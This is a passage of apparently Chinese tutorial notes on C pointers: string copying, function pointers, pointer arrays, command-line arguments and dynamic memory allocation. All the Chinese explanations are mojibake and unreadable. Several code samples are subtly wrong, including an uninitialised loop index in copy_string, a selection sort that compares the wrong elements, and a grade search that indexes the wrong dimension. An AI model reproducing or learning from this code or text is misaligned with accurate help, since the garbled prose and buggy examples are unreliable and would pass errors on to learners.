¼å¼è¾“å‡ºæ—¶,é‡åˆ°ç¬¬ä¸€ä¸ª\\0åé¢çš„å­—ç¬¦å°±ä¸ä¼šè¾“å‡ºäº†. å¦‚æœç”¨%cé€ä¸ªå­—ç¬¦è¾“å‡ºæ˜¯å¯ä»¥è¾“å‡ºåé¢è¿™äº›å­—ç¬¦çš„. 2)ç”¨å­—ç¬¦å‹æŒ‡é’ˆå˜é‡ä½œå®å‚ #include&lt;stdio.h&gt; int main() { void copy_string(char from[], char to[]); char a[] = &quot;I am a teacher.&quot;; char b[] = &quot;You are a student.&quot;; char *from = a; char *to = b; printf(&quot;string a:%s\\nstring b:%s\\n&quot;, a, b); printf(&quot;copy string a to string b:\\n&quot;); copy_string(from, to); printf(&quot;string a:%s\\nstring b:%s\\n&quot;, a, b); return 0; } void copy_string(char from[], char to[]) { int i; while (from[i] != &#39;\\0&#39;) { to[i] = from[i]; i++; } to[i] = &#39;\\0&#39;; } 3)ç”¨å­—ç¬¦æŒ‡é’ˆå˜é‡ä½œå½¢å‚å’Œå®å‚ #include&lt;stdio.h&gt; int main() { void copy_string(char from[], char to[]); char *a = &quot;I am a teacher.&quot;; char b[] = &quot;You are a student.&quot;; char *p = b; printf(&quot;string a:%s\\nstring b:%s\\n&quot;, a, b); printf(&quot;copy string a to string b:\\n&quot;); copy_string(a, p); printf(&quot;string a:%s\\nstring b:%s\\n&quot;, a, b); return 0; } void copy_string(char *from, char *to) { for (; *from != &#39;\\0&#39;; ++from,++to) { *to = *from; } *to = &#39;\\0&#39;; } //ç²¾ç®€ void copy_string(char *from, char *to) { while ((*to = *from) != &#39;\\0&#39;) { ++from, ++to; } *to = &#39;\\0&#39;; } //å†ç²¾ç®€ void copy_string(char *from, char *to) { while ((*to++ = *from++) != &#39;\\0&#39;); *to = &#39;\\0&#39;; } // void copy_string(char *from, char *to) { while (*from != &#39;\\0&#39;) { *to++ = *from++; } *to = &#39;\\0&#39;; } // ASCIIç  void copy_string(char *from, char *to) { while (*from) { *to++ = *from++; } *to = &#39;\\0&#39;; } //è¿˜å¯ä»¥ç®€åŒ–ä¸º while (*to++ = *from++); ç­‰ä»·äº while ((*to++ = *from++) != &#39;\\0&#39;); //for for (; *to++ = *from++;); æˆ–è€… for (; (*to++ = *from++)!=&#39;\\0&#39;;); ä¹Ÿå¯ä»¥ä½¿ç”¨å­—ç¬¦æ•°ç»„åä½œå‡½æ•°å½¢å‚ï¼Œåœ¨å‡½æ•°ä¸­å¦å®šä¹‰ä¸¤ä¸ªæŒ‡é’ˆå˜é‡p1ï¼Œp2.å‡½æ•°copy_stringå¯å†™ä¸º void copy_string(char from[], char to[]) { char *p1, *p2; p1 = from; p2 = to; while ((*p2++ = *p1++) != &#39;\\0&#39;); } ä½¿ç”¨å­—ç¬¦æŒ‡é’ˆå˜é‡å’Œå­—ç¬¦æ•°ç»„çš„æ¯”è¾ƒ å­—ç¬¦æ•°ç»„ç”±è‹¥å¹²ä¸ªå…ƒç´ ç»„æˆï¼Œæ¯ä¸ªå…ƒç´ ä¸­æ”¾ä¸€ä¸ªå­—ç¬¦ï¼Œè€Œå­—ç¬¦æŒ‡é’ˆå˜é‡ä¸­å­˜æ”¾çš„æ˜¯åœ°å€(å­—ç¬¦ä¸²ç¬¬1ä¸ªå­—ç¬¦çš„åœ°å€),ç»ä¸æ˜¯å°†å­—ç¬¦ä¸²æ”¾åˆ°å­—ç¬¦æŒ‡é’ˆå˜é‡ä¸­. èµ‹å€¼æ–¹å¼. å¯ä»¥å¯¹å­—ç¬¦æŒ‡é’ˆå˜é‡èµ‹å€¼,ä½†ä¸èƒ½å¯¹æ•°ç»„åèµ‹å€¼ åˆå§‹åŒ–çš„å«ä¹‰. æ•°ç»„å¯ä»¥åœ¨å®šä¹‰æ—¶å¯¹å„å…ƒç´ èµ‹åˆå€¼,ä½†ä¸èƒ½ç”¨èµ‹å€¼è¯­å¥å¯¹å­—ç¬¦æ•°ç»„ä¸­çš„å…¨éƒ¨å…ƒç´ æ•´ä½“èµ‹å€¼ å­˜å‚¨å•å…ƒçš„å†…å®¹. ç¼–è¯‘æ—¶ä¸ºå­—ç¬¦æ•°ç»„åˆ†é…è‹¥å¹²å­˜å‚¨å•å…ƒ,ä»¥å­˜æ”¾å„å…ƒç´ çš„å€¼,è€Œå¯¹å­—ç¬¦æŒ‡é’ˆå˜é‡,åªåˆ†é…ä¸€ä¸ªå­˜å‚¨å•å…ƒ. å¦‚æœå®šä¹‰äº†å­—ç¬¦æ•°ç»„,ä½†æœªå¯¹å®ƒèµ‹å€¼,è¿™æ—¶æ•°ç»„ä¸­çš„å…ƒç´ çš„å€¼æ˜¯ä¸å¯é¢„æ–™çš„. å¦‚æœå®šä¹‰äº†å­—ç¬¦æŒ‡é’ˆå˜é‡,åº”å½“åŠæ—¶æŠŠä¸€ä¸ªå­—ç¬¦å˜é‡(æˆ–å­—ç¬¦æ•°ç»„å…ƒç´ )çš„åœ°å€èµ‹ç»™å®ƒï¼Œä½¿å®ƒæŒ‡å‘ä¸€ä¸ªå­—ç¬¦å‹æ•°æ®ï¼Œå¦‚æœæœªå¯¹å®ƒèµ‹äºˆä¸€ä¸ªåœ°å€å€¼ï¼Œå®ƒå¹¶æœªå…·ä½“æŒ‡å‘ä¸€ä¸ªç¡®å®šçš„å¯¹è±¡ï¼Œæ­¤æ—¶å¦‚æœå‘è¯¥æŒ‡é’ˆå˜é‡æ‰€æŒ‡å‘çš„å¯¹è±¡è¾“å…¥æ•°æ®ï¼Œå¯èƒ½ä¼šå‡ºç°ä¸¥é‡çš„åæœï¼š int main() { char *a; scanf(&quot;%s&quot;, a); return 0; } //å±é™©çš„! æŒ‡é’ˆå˜é‡çš„å€¼æ˜¯å¯ä»¥æ”¹å˜çš„,è€Œå­—ç¬¦æ•°ç»„åä»£è¡¨ä¸€ä¸ªå›ºå®šçš„å€¼(æ•°ç»„é¦–å…ƒç´ çš„åœ°å€)ä¸èƒ½æ”¹å˜. #include&lt;stdio.h&gt; int main() { char *a = &quot;I love China!&quot;; a = a + 7; printf(&quot;%s\\n&quot;, a); return 0; } å¼•ç”¨æ•°ç»„å…ƒç´  å¯¹å­—ç¬¦æ•°ç»„å¯ä»¥ä½¿ç”¨ä¸‹æ ‡æ³•å¼•ç”¨ä¸€ä¸ªæ•°ç»„å…ƒç´ ,ä¹Ÿå¯ä»¥ç”¨åœ°å€æ³•(*(a+5)). å¯¹å­—ç¬¦æŒ‡é’ˆå˜é‡pä½¿å®ƒæŒ‡å‘æ•°ç»„açš„é¦–å…ƒç´ ,å¯ä»¥ä½¿ç”¨æŒ‡é’ˆå˜é‡å¸¦ä¸‹æ ‡æ³•(p[5])å¼•ç”¨ä¸€ä¸ªæ•°ç»„å…ƒç´ ,ä¹Ÿå¯ä»¥ç”¨åœ°å€æ³•. ç”¨æŒ‡é’ˆå˜é‡æŒ‡å‘ä¸€ä¸ªæ ¼å¼å­—ç¬¦ä¸²,å¯ä»¥ç”¨å®ƒä»£æ›¿printfå‡½æ•°ä¸­çš„æ ¼å¼å­—ç¬¦ä¸² char *format; format = &quot;a=%d,b=%f\\n&quot;; printf(format, a, b); è¿™ç§printfå‡½æ•°ç§°ä¸ºå¯å˜æ ¼å¼è¾“å‡ºå‡½æ•°. æŒ‡å‘å‡½æ•°çš„æŒ‡é’ˆæ¯æ¬¡è°ƒç”¨å‡½æ•°æ—¶éƒ½ä¼šä»å‡½æ•°åˆ†é…çš„å†…å­˜ç©ºé—´çš„èµ·å§‹åœ°å€å¼€å§‹æ‰§è¡Œæ­¤æ®µå‡½æ•°ä»£ç ã€‚ å‡½æ•°åä»£è¡¨å‡½æ•°çš„èµ·å§‹åœ°å€. å¯ä»¥å®šä¹‰ä¸€ä¸ªæŒ‡å‘å‡½æ•°çš„æŒ‡é’ˆå˜é‡,ç”¨æ¥å­˜æ”¾æŸä¸€å‡½æ•°çš„èµ·å§‹åœ°å€.è¿™å°±æ„å‘³ç€æ­¤æŒ‡é’ˆå˜é‡æŒ‡å‘è¯¥å‡½æ•°. int (*p)(int,int); ç”¨å‡½æ•°æŒ‡é’ˆå˜é‡è°ƒç”¨å‡½æ•°.ç”¨å‡½æ•°æ±‚aå’Œbä¸­çš„å¤§è€….#include&lt;stdio.h&gt; int main() { int max(int, int); int (*p)(int, int); int a, b, c; p = max; printf(&quot;please enter a and b:&quot;); scanf(&quot;%d,%d&quot;, &amp;a, &amp;b); c = (*p)(a, b); printf(&quot;max is:%d&quot;, c); return 0; } int max(int x, int y) { return x &gt; y ? x : y; } æ€ä¹ˆå®šä¹‰å’Œä½¿ç”¨æŒ‡å‘å‡½æ•°çš„æŒ‡é’ˆå˜é‡ç±»å‹å (*æŒ‡é’ˆå˜é‡å)(å‡½æ•°å‚æ•°è¡¨åˆ—) ç±»å‹åæ˜¯å‡½æ•°è¿”å›å€¼ç±»å‹ å¯¹æŒ‡å‘å‡½æ•°çš„æŒ‡é’ˆå˜é‡ä¸èƒ½è¿›è¡Œç®—æœ¯è¿ç®—.å¦‚p+n,p++,pâ€”ç­‰è¿ç®—éƒ½æ˜¯æ— æ„ä¹‰çš„. è¾“å…¥ä¸¤ä¸ªæ•´æ•°,è®©ç”¨æˆ·é€‰æ‹©1æˆ–2,é€‰1æ—¶è°ƒç”¨maxå‡½æ•°,è¾“å‡ºäºŒè€…ä¸­çš„å¤§æ•°,é€‰2æ—¶è°ƒç”¨minå‡½æ•°,è¾“å‡ºäºŒè€…ä¸­çš„å°æ•°.#include&lt;stdio.h&gt; int main() { int max(int, int); int min(int, int); int (*p)(int, int); int a, b, c, d; printf(&quot;please enter two integer:\\n&quot;); scanf(&quot;%d,%d&quot;, &amp;a, &amp;b); printf(&quot;please choose 1 or 2:\\n&quot;); scanf(&quot;%d&quot;, &amp;c); if (c == 1) p = max; else if (c == 2) p = min; d = (*p)(a, b); if (c == 1) printf(&quot;max is:%d&quot;, d); else printf(&quot;min is:%d&quot;, d); return 0; } int max(int x, int y) { return x &gt; y ? x : y; } int min(int x, int y) { return x &lt; y ? x : y; } ç”¨æŒ‡å‘å‡½æ•°çš„æŒ‡é’ˆä½œå‡½æ•°å‚æ•° æŒ‡å‘å‡½æ•°çš„æŒ‡é’ˆå˜é‡çš„ä¸€ä¸ªé‡è¦ç”¨é€”æ˜¯æŠŠå‡½æ•°çš„å…¥å£åœ°å€ä½œä¸ºå‚æ•°ä¼ é€’åˆ°å…¶ä»–å‡½æ•°. æœ‰ä¸¤ä¸ªæ•´æ•°aå’Œb,ç”±ç”¨æˆ·è¾“å…¥1,2å’Œ3.å¦‚è¾“å…¥1,ç¨‹åºå°±ç»™å‡ºaå’Œbä¸­çš„å¤§è€….è¾“å…¥2,ç¨‹åºå°±ç»™å‡ºaå’Œbä¸­çš„å°è€….è¾“å…¥3,åˆ™æ±‚aä¸bä¹‹å’Œ.#include&lt;stdio.h&gt; int main() { int max(int, int); int min(int, int); int sum(int, int); int fun(int, int, int (*p)(int, int)); int a, b, c, d; printf(&quot;please enter two integer:\\n&quot;); scanf(&quot;%d,%d&quot;, &amp;a, &amp;b); printf(&quot;please choose 1 , 2 or 3:\\n&quot;); scanf(&quot;%d&quot;, &amp;c); if (c == 1) fun(a, b, max); else if (c == 2) fun(a, b, min); else if (c == 3) fun(a, b, sum); return 0; } int fun(int x, int y, int (*p)(int, int)) { int result; result = (*p)(x, y); printf(&quot;%d\\n&quot;, result); } int max(int x, int y) { printf(&quot;max=&quot;); return x &gt; y ? x : y; } int min(int x, int y) { printf(&quot;min=&quot;); return x &lt; y ? x : y; } int sum(int x, int y) { printf(&quot;sum=&quot;); return x + y; } è¿”å›æŒ‡é’ˆå€¼çš„å‡½æ•°å®šä¹‰è¿”å›æŒ‡é’ˆå€¼å‡½æ•°çš„åŸå‹çš„ä¸€èˆ¬å½¢å¼ä¸º: ç±»å‹å *å‡½æ•°å (å‡½æ•°å‚æ•°è¡¨åˆ—) æœ‰aä¸ªå­¦ç”Ÿ,æ¯ä¸ªå­¦ç”Ÿæœ‰bé—¨è¯¾ç¨‹çš„æˆç»©,è¦æ±‚åœ¨ç”¨æˆ·è¾“å…¥å­¦ç”Ÿåºå·ä»¥å,èƒ½è¾“å‡ºè¯¥å­¦ç”Ÿçš„å…¨éƒ¨æˆç»©.ç”¨æŒ‡é’ˆå‡½æ•°å®ç°#include&lt;stdio.h&gt; int main() { float score[][4] = {{60, 70, 80, 90}, {56, 74, 45, 86}, {65, 88, 67, 99}}; float *search(float (*pointer)[4], int n); float *p; int i, k; printf(&quot;enter number of student:\\n&quot;); scanf(&quot;%d&quot;, &amp;k); p = search(score, k); for (i = 0; i &lt; 4; ++i) { printf(&quot;%5.2f\\t&quot;, *(p + i));//è¾“å‡º score[k][0]~score[k][3]; } return 0; } float *search(float (*pointer)[4], int n) { float *pt; pt = *(pointer + n); //ptçš„å€¼æ˜¯&amp;score[k][0] return pt; } æ‰¾å‡ºå…¶ä¸­æœ‰ä¸åŠæ ¼çš„è¯¾ç¨‹çš„å­¦ç”ŸåŠå…¶å­¦ç”Ÿå·.#include&lt;stdio.h&gt; int main() { float score[][4] = {{60, 70, 80, 90}, {56, 74, 45, 86}, {65, 88, 67, 99}}; float *search(float (*pointer)[4]); float *p; int i, j; for (i = 0; i &lt; 3; ++i) { p = search(score + i); if (p == *(score + i)) { printf(&quot;No.%d score:&quot;, i); for (j = 0; j &lt; 4; ++j) printf(&quot;%5.2f&quot;, *(p + j)); printf(&quot;\\n&quot;); } } } float *search(float (*pointer)[4]) { int i = 0; float *pt; pt = NULL; for (; i &lt; 4; ++i) { if (*(*(pointer + i)) &lt; 60) pt = *pointer; } return pt; } æŒ‡é’ˆæ•°ç»„å’Œå¤šç»´æŒ‡é’ˆ ä¸€ä¸ªæ•°ç»„ï¼Œè‹¥å…¶å…ƒç´ å‡ä¸ºæŒ‡é’ˆç±»å‹æ•°æ®ï¼Œç§°ä¸ºæŒ‡é’ˆæ•°ç»„. å®šä¹‰ä¸€ä¸ªæŒ‡é’ˆæ•°ç»„ ç±»å‹å *æ•°ç»„å[æ•°ç»„é•¿åº¦]; int *p[4]; å°†è‹¥å¹²å­—ç¬¦ä¸²æŒ‰å­—æ¯é¡ºåº(ç”±å°åˆ°å¤§)è¾“å‡º.#include &lt;stdio.h&gt; #include &lt;string.h&gt; int main() { void sort(char *name[], int n); void print(char *name[], int n); char *name[] = {&quot;Follow me&quot;, &quot;BASIC&quot;, &quot;Great Wall&quot;, &quot;FORTRAN&quot;, &quot;Computer design&quot;}; int n = 5; sort(name, n); print(name, n); return 0; } void sort(char *name[], int n) { char *temp; int i, j, k; for (i = 0; i &lt; n - 1; i++) { k = i; for (j = i + 1; j &lt; n; j++) if (strcmp(name[k], name[i]) &gt; 0) k = j; if (k != i) { temp = name[i]; name[i] = name[k]; name[k] = temp; } } } void print1(char *name[], int n) { int i; for (i = 0; i &lt; n; i++) printf(&quot;%s\\n&quot;, name[i]); } //ä¹Ÿå¯ä»¥æ”¹å†™æˆ void print(char *name[], int n) { int i = 0; char *p; p = name[0]; while (i &lt; n) { p = *(name + i++); // name[i]; i++; printf(&quot;%s\\n&quot;, p); } } æŒ‡å‘æŒ‡é’ˆæ•°æ®çš„æŒ‡é’ˆå˜é‡å®šä¹‰char **p; è¿ç®—ç¬¦çš„ç»“åˆæ€§æ˜¯ä»å³åˆ°å·¦çš„. \\(*p). ä¹Ÿå°±æ˜¯è¯´pæŒ‡å‘ä¸€ä¸ªå­—ç¬¦æŒ‡é’ˆå˜é‡(è¿™ä¸ªå­—ç¬¦æŒ‡é’ˆå˜é‡æŒ‡å‘ä¸€ä¸ªå­—ç¬¦å‹æ•°æ®),å¦‚æœå¼•ç”¨*p,å°±å¾—åˆ°pæ‰€æŒ‡å‘çš„å­—ç¬¦æŒ‡é’ˆå˜é‡çš„å€¼. ä½¿ç”¨æŒ‡å‘æŒ‡é’ˆæ•°æ®çš„æŒ‡é’ˆå˜é‡#include &lt;stdio.h&gt; int main() { char *name[] = {&quot;Follow me&quot;, &quot;BASIC&quot;, &quot;Great Wall&quot;, &quot;FORTRAN&quot;, &quot;Computer design&quot;}; char **p; int i; for (i = 0; i &lt; 5; i++) { p = name + i; printf(&quot;%s\\n&quot;, *p); } return 0; } æœ‰ä¸€ä¸ªæŒ‡é’ˆæ•°ç»„,å…¶å…ƒç´ åˆ†åˆ«æŒ‡å‘ä¸€ä¸ªæ•´å‹æ•°ç»„çš„å…ƒç´ ,ç”¨æŒ‡å‘æŒ‡é’ˆæ•°æ®çš„æŒ‡é’ˆå˜é‡,è¾“å‡ºæ•´å‹æ•°ç»„å„å…ƒç´ çš„å€¼.#include &lt;stdio.h&gt; int main() { int a[5] = {1, 3, 5, 7, 9}; int *num[5] = {&amp;a[0], &amp;a[1], &amp;a[2], &amp;a[3], &amp;a[4]}; int **p, i; p = num; for (i = 0; i &lt; 5; i++) { printf(&quot;%d\\n&quot;, **p); p++; } printf(&quot;\\n&quot;); return 0; } é—´æ¥è®¿é—®åœ¨ä¸€ä¸ªæŒ‡é’ˆå˜é‡ä¸­å­˜æ”¾ä¸€ä¸ªç›®æ ‡å˜é‡çš„åœ°å€ï¼Œè¿™å°±æ˜¯â€œå•æœºé—´å€â€. æŒ‡å‘æŒ‡é’ˆæ•°æ®çš„æŒ‡é’ˆç”¨çš„æ˜¯â€œäºŒçº§é—´å€â€. é—´å€æ–¹æ³•å¯ä»¥å»¶ä¼¸åˆ°æ›´å¤šçš„çº§,å³å¤šé‡æŒ‡é’ˆ. æŒ‡é’ˆæ•°ç»„ä½œmainå‡½æ•°çš„å½¢å‚mainå¯ä»¥ç”¨å‚æ•°: int main(int argc,char *argv[]) å…¶ä¸­ï¼Œargcå’Œargvå°±æ˜¯mainå‡½æ•°çš„å½¢å‚ï¼Œå®ƒä»¬å°±æ˜¯ç¨‹åºçš„â€å‘½ä»¤è¡Œå‚æ•°â€. argcæ˜¯å‚æ•°çš„ä¸ªæ•°,argvæ˜¯å‚æ•°å‘é‡,å®ƒæ˜¯ä¸€ä¸ª* charæŒ‡é’ˆæ•°ç»„,æ•°ç»„ä¸­æ¯ä¸€ä¸ªå…ƒç´ (å…¶å€¼ä¸ºæŒ‡é’ˆ)æŒ‡å‘å‘½ä»¤è¡Œä¸­çš„ä¸€ä¸ªå­—ç¬¦ä¸²çš„é¦–å­—ç¬¦. ç”¨å¸¦å‚æ•°çš„mainå‡½æ•°,å…¶ç¬¬ä¸€ä¸ªå½¢å‚å¿…é¡»æ˜¯intå‹,ç”¨æ¥æ¥æ”¶å½¢å‚ä¸ªæ•°,ç¬¬äºŒä¸ªå‚æ•°å¿…é¡»æ˜¯å­—ç¬¦æŒ‡é’ˆæ•°ç»„,ç”¨æ¥æ¥æ”¶ä»æ“ä½œç³»ç»Ÿå‘½ä»¤è¡Œä¼ æ¥çš„å­—ç¬¦ä¸²ä¸­é¦–å­—æ¯çš„åœ°å€. åœ¨æ“ä½œå‘½ä»¤ä¸‹,å®å‚æ˜¯å’Œæ‰§è¡Œæ–‡ä»¶çš„å‘½ä»¤ä¸€èµ·ç»™å‡ºçš„.ä¾‹å¦‚åœ¨DOS,UNIXæˆ–Linuxç­‰ç³»ç»Ÿçš„æ“ä½œå‘½ä»¤çŠ¶æ€ä¸‹,åœ¨å‘½ä»¤è¡Œä¸­åŒ…æ‹¬äº†å‘½ä»¤åå’Œéœ€è¦ä¼ ç»™mainå‡½æ•°çš„å‚æ•°. å‘½ä»¤è¡Œçš„ä¸€èˆ¬å½¢å¼ä¸º å‘½ä»¤å å‚æ•°1 å‚æ•°2Â·Â·Â·å‚æ•°n å‘½ä»¤åå’Œå„å‚æ•°ä¹‹é—´ç”¨ç©ºæ ¼åˆ†éš”.å‘½ä»¤è¡Œæ˜¯å¯æ‰§è¡Œæ–‡ä»¶å(æ­¤æ–‡ä»¶å«mainå‡½æ•°) å¦‚: file1 China Beijing file1ä¸ºå¯æ‰§è¡Œæ–‡ä»¶å(å®é™…ä¸Š,æ–‡ä»¶ååº”åŒ…å«ç›˜ç¬¦,è·¯å¾„),Chinaå’ŒBeijingæ˜¯è°ƒç”¨mainå‡½æ•°æ—¶çš„å®å‚. æ–‡ä»¶åä¹Ÿä½œä¸ºä¸€ä¸ªå‚æ•°.argcçš„å€¼ç­‰äº3(æœ‰3ä¸ªå‘½ä»¤è¡Œå‚æ•°:file1,China,Beijing) å‘½ä»¤è¡Œå‚æ•°å¿…é¡»éƒ½æ˜¯å­—ç¬¦ä¸²(â€œfile1â€,â€Chinaâ€,â€Beijingâ€éƒ½æ˜¯å­—ç¬¦ä¸²),è¿™äº›å­—ç¬¦ä¸²çš„é¦–åœ°å€æ„æˆä¸€ä¸ªæŒ‡é’ˆæ•°ç»„. æŒ‡é’ˆæ•°ç»„argvä¸­çš„å…ƒç´ argv[0]æŒ‡å‘å­—ç¬¦ä¸²â€file1â€çš„é¦–å­—ç¬¦(argv[0]çš„å€¼æ˜¯å­—ç¬¦ä¸²â€file1â€çš„é¦–åœ°å€). å:file1çš„æ–‡ä»¶,å®ƒåŒ…å«ä»¥ä¸‹çš„mainå‡½æ•°: #include &lt;stdio.h&gt; int main(int argc, char *argv[]) { while (argc &gt; 1) { ++argv; printf(&quot;%s\\n&quot;, *argv); --argc; } return 0; } é€‰æ‹©â€œå·¥ç¨‹â€-â€œè®¾ç½®â€-â€œè°ƒè¯•â€-â€œç¨‹åºå˜é‡â€å‘½ä»¤ï¼Œè¾“å…¥ China Beijingï¼Œå†è¿è¡Œç¨‹åºã€‚ è¾“å‡º China Beijing æ”¹å†™: #include &lt;stdio.h&gt; int main(int argc, char *argv[]) { while (argc-- &gt; 1) printf(&quot;%s\\n&quot;, *++argv); return 0; } è®¸å¤šæ“ä½œç³»ç»Ÿæä¾›äº†echoå‘½ä»¤,å®ƒçš„ä½œç”¨æ˜¯å®ç°â€å‚æ•°å›é€â€,å³å°†echoåé¢çš„å„å‚æ•°(å„å­—ç¬¦ä¸²)åœ¨åŒä¸€è¡Œä¸Šè¾“å‡º.å®ç°â€å‚æ•°å›é€â€çš„Cç¨‹åº(æ–‡ä»¶åä¸ºecho.c)å¦‚ä¸‹: #include &lt;stdio.h&gt; int main(int argc, char *argv[]) { while (--argc &gt; 0) //å½“å‘½ä»¤è¡Œçš„å‚æ•°å¤šäº1 printf(&quot;%s%c\\n&quot;, *++argv, (argc &gt; 1) ? &#39; &#39; : &#39;\\n&#39;);//ä»ç¬¬2ä¸ªå‚æ•°å¼€å§‹è¾“å‡ºå„å­—å‚æ•°(å­—ç¬¦ä¸²) return 0; } å¦‚æœç”¨UNIXç³»ç»Ÿçš„å‘½ä»¤è¡Œè¾“å…¥: $ ./echo Computer and C Languageâ†™ //echoæ˜¯å¯æ‰§è¡Œæ–‡ä»¶å. ä¼šåœ¨æ˜¾ç¤ºå±ä¸Šè¾“å‡º: Computer and C Language æˆ–è€… #include &lt;stdio.h&gt; int main(int argc, char *argv[]) { int i; for (i = 1; i &lt; argc; i++) printf(&quot;%s%c\\n&quot;, argv[i], (argc &gt; 1) ? &#39; &#39; : &#39;\\n&#39;); return 0; } åŠ¨æ€å†…å­˜åˆ†é…ä¸æŒ‡å‘å®ƒçš„æŒ‡é’ˆå˜é‡å†…å­˜çš„åŠ¨æ€åˆ†é…å…¨å±€å˜é‡æ˜¯åˆ†é…åœ¨å†…å­˜ä¸­çš„é™æ€å­˜å‚¨åŒºçš„ï¼Œéé™æ€çš„å±€éƒ¨å˜é‡(åŒ…æ‹¬å½¢å‚)æ˜¯åˆ†é…åœ¨å†…å­˜ä¸­çš„åŠ¨æ€å­˜å‚¨åŒºçš„,è¿™ä¸ªå­˜å‚¨åŒºæ˜¯ä¸€ä¸ªç§°ä¸ºæ ˆ(stack)çš„åŒºåŸŸ. Cè¯­è¨€è¿˜å…è®¸å»ºç«‹å†…å­˜åŠ¨æ€åˆ†é…åŒºåŸŸ,ä»¥å­˜æ”¾ä¸€äº›ä¸´æ—¶ç”¨çš„æ•°æ®,è¿™äº›æ•°æ®ä¸å¿…åœ¨ç¨‹åºçš„å£°æ˜éƒ¨åˆ†å®šä¹‰,ä¹Ÿä¸å¿…ç­‰åˆ°å‡½æ•°ç»“æŸæ—¶æ‰é‡Šæ”¾.è€Œæ˜¯éœ€è¦æ—¶éšæ—¶å¼€è¾Ÿ,ä¸éœ€è¦æ—¶éšæ—¶é‡Šæ”¾.è¿™äº›æ•°æ®æ˜¯ä¸´æ—¶å­˜æ”¾åœ¨ä¸€ä¸ªç‰¹åˆ«çš„è‡ªç”±å­˜å‚¨åŒº.ç§°ä¸ºå †(heap)åŒº.å¯ä»¥æ ¹æ®éœ€è¦,å‘ç³»ç»Ÿç”³è¯·æ‰€éœ€å¤§å°çš„ç©ºé—´.ç”±äºæœªåœ¨å£°æ˜éƒ¨åˆ†å®šä¹‰å®ƒä»¬ä¸ºå˜é‡æˆ–æ•°ç»„,å› æ­¤ä¸èƒ½é€šè¿‡å˜é‡åæˆ–æ•°ç»„åå»å¼•ç”¨è¿™äº›æ•°æ®,åªèƒ½é€šè¿‡æŒ‡é’ˆæ¥å¼•ç”¨. æ€ä¹ˆå»ºç«‹å†…å­˜çš„åŠ¨æ€åˆ†é… include ç”¨mallocå‡½æ•°å¼€è¾ŸåŠ¨æ€å­˜å‚¨åŒº void *malloc(unsigned int size); ä½œç”¨æ˜¯åœ¨å†…å­˜çš„åŠ¨æ€å­˜å‚¨åŒºä¸­åˆ†é…ä¸€ä¸ªé•¿åº¦ä¸ºsizeçš„è¿ç»­ç©ºé—´.å½¢å‚sizeçš„ç±»å‹ä¸ºæ— ç¬¦å·æ•´å‹(ä¸å…è®¸ä¸ºè´Ÿæ•°).æ­¤å‡½æ•°çš„å€¼(è¿”å›å€¼)æ˜¯æ‰€åˆ†é…åŒºåŸŸçš„ç¬¬ä¸€ä¸ªå­—èŠ‚çš„åœ°å€.æˆ–è€…è¯´æ˜¯ä¸€ä¸ªæŒ‡é’ˆå‹å‡½æ•°. malloc(100); //å¼€è¾Ÿ100å­—èŠ‚çš„ä¸´æ—¶åˆ†é…åŸŸ,å‡½æ•°å€¼ä¸ºå…¶ç¬¬1ä¸ªå­—èŠ‚çš„åœ°å€ æ³¨æ„æŒ‡é’ˆçš„åŸºç±»å‹ä¸ºvoid,å³æŒ‡é’ˆä¸æŒ‡å‘ä»»ä½•ç±»å‹çš„æ•°æ®,åªæä¾›ä¸€ä¸ªçº¯åœ°å€.å¦‚æœæ­¤å‡½æ•°æœªèƒ½æˆåŠŸåœ°æ‰§è¡Œ(ä¾‹å¦‚å†…å­˜ç©ºé—´ä¸è¶³),åˆ™è¿”å›ç©ºæŒ‡é’ˆ(NULL). ç”¨callocå‡½æ•°å¼€è¾ŸåŠ¨æ€å­˜å‚¨åŒº void *calloc(unsigned n,unsigned int size); åœ¨å†…å­˜ä¸­åŠ¨æ€åœ°åˆ†é… num ä¸ªé•¿åº¦ä¸º size çš„è¿ç»­ç©ºé—´ï¼Œå¹¶å°†æ¯ä¸€ä¸ªå­—èŠ‚éƒ½åˆå§‹åŒ–ä¸º 0ã€‚æ‰€ä»¥å®ƒçš„ç»“æœæ˜¯åˆ†é…äº† num*size ä¸ªå­—èŠ‚é•¿åº¦çš„å†…å­˜ç©ºé—´ï¼Œå¹¶ä¸”æ¯ä¸ªå­—èŠ‚çš„å€¼éƒ½æ˜¯0. è¿™å°±æ˜¯åŠ¨æ€æ•°ç»„.å‡½æ•°è¿”å›å€¼æŒ‡å‘æ‰€åˆ†é…åŸŸçš„ç¬¬ä¸€ä¸ªå­—èŠ‚çš„æŒ‡é’ˆ;å¦‚æœåˆ†é…ä¸æˆåŠŸ,åˆ™è¿”å›NULL. p = calloc(50, 4);//å¼€è¾Ÿ50Ã—4ä¸ªå­—èŠ‚çš„ä¸´æ—¶åˆ†é…åŸŸ,æŠŠé¦–åœ°å€èµ‹ç»™æŒ‡é’ˆå˜é‡p ç”¨reallocé‡æ–°åˆ†é…åŠ¨æ€å­˜å‚¨åŒº. void *realloc(void *p, unsigned int size); å¦‚æœå·²ç»é€šè¿‡mallocå‡½æ•°æˆ–callocå‡½æ•°è·å¾—ä¹åŠ¨æ€ç©ºé—´,æƒ³æ”¹å˜å¤§å°,å¯ä»¥ç”¨reallocå‡½æ•°é‡æ–°åˆ†é…. ç”¨reallocå‡½æ•°å°†pæ‰€æŒ‡å‘çš„åŠ¨æ€ç©ºé—´çš„å¤§å°æ”¹å˜ä¸ºsize.pçš„å€¼ä¸å˜.pçš„å€¼ä¸å˜.å¦‚æœé‡åˆ†é…ä¸æˆåŠŸ,è¿”å›NULL.å¦‚: realloc(p,50); ç”¨freeå‡½æ•°é‡Šæ”¾åŠ¨æ€å­˜å‚¨åŒº void free(*p); å…¶ä½œç”¨æ˜¯é‡Šæ”¾æŒ‡é’ˆå˜é‡pæ‰€æŒ‡å‘çš„åŠ¨æ€ç©ºé—´,ä½¿è¿™éƒ¨åˆ†ç©ºé—´èƒ½é‡æ–°è¢«å…¶ä»–å˜é‡ä½¿ç”¨. påº”æ˜¯æœ€è¿‘ä¸€æ¬¡è°ƒç”¨callocæˆ–mallocå‡½æ•°æ—¶å¾—åˆ°çš„å‡½æ•°è¿”å›å€¼. free(p);//é‡Šæ”¾æŒ‡é’ˆå˜é‡pæ‰€æŒ‡å‘çš„å·²åˆ†é…çš„é¢åŠ¨æ€ç©ºé—´ freeå‡½æ•°æ— è¿”å›å€¼. voidæŒ‡é’ˆç±»å‹å¯ä»¥å®šä¹‰ä¸€ä¸ªåŸºç±»å‹ä¸ºvoidçš„æŒ‡é’ˆå˜é‡(å³void*å‹å˜é‡). 